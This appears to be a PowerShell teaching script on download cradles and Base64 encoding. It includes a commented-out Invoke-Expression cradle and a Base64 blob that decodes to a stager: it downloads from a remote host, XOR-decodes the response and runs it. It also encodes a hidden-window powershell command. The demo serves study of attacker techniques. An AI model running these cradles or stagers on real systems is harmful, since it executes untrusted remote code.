$wc = New-Object System.Net.WebClient
$launcher = "http://2.2.2.138/launcher-demo.ps1"
$outFile = "C:\users\student\Desktop\launcher-demo.ps1"

$wc.DownloadFile($launcher, $outFile)

# Evil method!
# do NOT freaking do this unless you know what your are doing
# know the code that you are aboout to execute... ALWAYS!!!
#Invoke-Expression($wc.DownloadString($launcher))



$b64 = "JABXAEMAPQBOAGUAdwAtAE8AQgBKAGUAQwB0ACAAUwBZAHMAdABlAE0ALgBOAEUAVAAuAFcAZQBCAEMAbABpAEUAbgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAdwBDAC4ASABlAEEAZABlAHIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBDAC4AUABSAG8AWABZACAAPQAgAFsAUwBZAFMAdABFAE0ALgBOAEUAdAAuAFcARQBCAFIARQBRAFUAZQBTAHQAXQA6ADoARABFAEYAQQBVAEwAdABXAEUAYgBQAHIAbwB4AFkAOwAkAHcAQwAuAFAAcgBvAFgAeQAuAEMAcgBFAEQARQBOAFQASQBhAGwAUwAgAD0AIABbAFMAeQBTAFQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAYQBsAEMAQQBDAEgAZQBdADoAOgBEAGUAZgBhAHUATABUAE4ARQB0AHcATwByAGsAQwByAEUAZABFAE4AdABpAEEATABzADsAJABLAD0AJwBIACUAWQB9ADwATwAjACEAWABKAFwAaABnAGsAQwBgACsAdgB0AE4AKQA3AEcAeABEADkANQBsAGYATQBtAF0AJwA7ACQASQA9ADAAOwBbAGMAaABhAFIAWwBdAF0AJABiAD0AKABbAGMAaABhAFIAWwBdAF0AKAAkAFcAYwAuAEQATwB3AE4ATABvAGEAZABTAFQAUgBpAE4AZwAoACIAaAB0AHQAcAA6AC8ALwAyAC4AMgAuADIALgAxADMAOAA6ADgAMAA4ADEALwBpAG4AZABlAHgALgBhAHMAcAAiACkAKQApAHwAJQB7ACQAXwAtAEIAWABPAHIAJABrAFsAJABpACsAKwAlACQAawAuAEwARQBOAGcAdABIAF0AfQA7AEkARQBYACAAKAAkAEIALQBqAE8AaQBOACcAJwApAA=="
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64))
$decoded
$decoded.Split(';')


# why encode/decode??
# demo
$string_to_encode = "powershell.exe -nop -noni -w hidden -c `"start-process notepad.exe`""
$test_here = {(Get-WindowsEdition)}.ToString()




function Invoke-EncodeBase64 {
    param([string]$Encode)
    $data = [System.Text.Encoding]::Unicode.GetBytes($Encode)
    $encoded = [System.Convert]::ToBase64String($data)
    Write-Output $encoded
}



function Invoke-DecodeBase64{
    param([string]$Decode)
    $data = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($decode))
    Write-Output $data
}


Invoke-EncodeBase64 -Encode $string_to_encode
Invoke-EncodeBase64 -Encode "start-process notepad.exe"
Invoke-EncodeBase64 -Encode $test_here
$decodedBase64 = Invoke-DecodeBase64 -Decode $b64
$decodedBase64.Split(';')

